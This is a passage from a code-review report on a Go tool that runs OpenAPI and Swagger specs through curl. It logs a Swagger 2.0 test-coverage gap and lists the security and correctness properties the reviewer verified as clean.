  nil`, matching `runResult`.

## Finding 32: The Swagger 2.0 body parameter is never executed end to end
- **Reviewer:** integration
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/e2e/e2e_test.go:914
- **Description:** `TestASwagger2SpecFlowsThroughTheWholeLoop` asserts `"createPet": "skipped"` — it
  is a POST and `--allow-mutations` is not passed on the 2.0 path, though it is on the 3.0 path
  (e2e_test.go:728). So the 2.0 `in: body` → `requestBody` conversion and the `consumes:` →
  content-type mapping are never sent on the wire, and `convert_test.go` asserts nothing about
  them. DESIGN.md §5 and §7 both require *"Phase 1 must verify conversion fidelity against real 2.0
  specs"*, and run.go:523's `headersFor` comment explicitly worries about "a converted Swagger 2.0
  formData operation" with nothing covering it. The conversion was confirmed correct by hand, so
  this is a coverage gap rather than a live defect.
- **Suggested fix:** Run `createPet` on `spec2Path` with `--allow-mutations` and assert the server
  saw a JSON body under `Content-Type: application/json`; add a convert_test asserting
  `consumes`/`produces` land on `requestBody.content` and `responses.*.content`.

---

## Verified clean

Recorded so the next cycle does not re-derive it. Traced and confirmed working: the full
spec → operation → request → curl config → exec → parse → validate → output → corpus path for 3.0
and 2.0 GETs; `--write-out '%{json}'` timing through to the JUnit `time` attribute; `--dry-run`'s
emitted curl proven byte-identical to the executed request by replaying it (e2e_test.go:480); the
`-q -K -` config-on-stdin mechanism with `-q` correctly first and no secret ever in argv
(config.go:109); `escapeDirective` matching curl's `unslashquote` exactly, including the
longest-match `Replacer` that avoids the double-escape bug; the 0600 temp body file created and
removed via `defer cleanupConfig()` after `cmd.Run`; profile mode enforcement (config.go:157);
history store/dir 0700/0600; `SweepStale` lstat'ing rather than following a planted symlink;
libopenapi's `AllowFileReferences`/`AllowRemoteReferences` correctly left false and its
stdout-writing default logger discarded (spec/load.go:29); path params `url.PathEscape`'d; query
credentials percent-encoded on the wire but symbolic in every display form; `curl.requestFailed`
scrubbing resolved and percent-encoded credential values from curl's stderr; `gen` and
`output/schema` walkers both depth- and `$ref`-cycle-bounded; JUnit built by `xml.Marshal` rather
than string assembly; §4's exit codes 0–5 each reproduced where documented; the `call` envelope
matching §4's sketch field for field; the §5 boundary rule that `operation`/`validate`/`gen` import
neither `curl` nor `twin` and that `secret` resolves only inside `internal/curl`; subprocess
lifecycle in `internal/curl/exec.go` (every curl reaped, no pipe-buffer deadlock possible, stdin
writer cannot block forever, `isolate()` correctly overriding `CommandContext`'s `Cancel`); `run`
strictly sequential with no goroutines anywhere in non-test code; the corpus lock held across the
whole read-modify-write and released by `defer` on every path; `replace()` a proper temp+rename;
no credential, key or token literal anywhere in the diff; no Phase 5–8 scope creep.
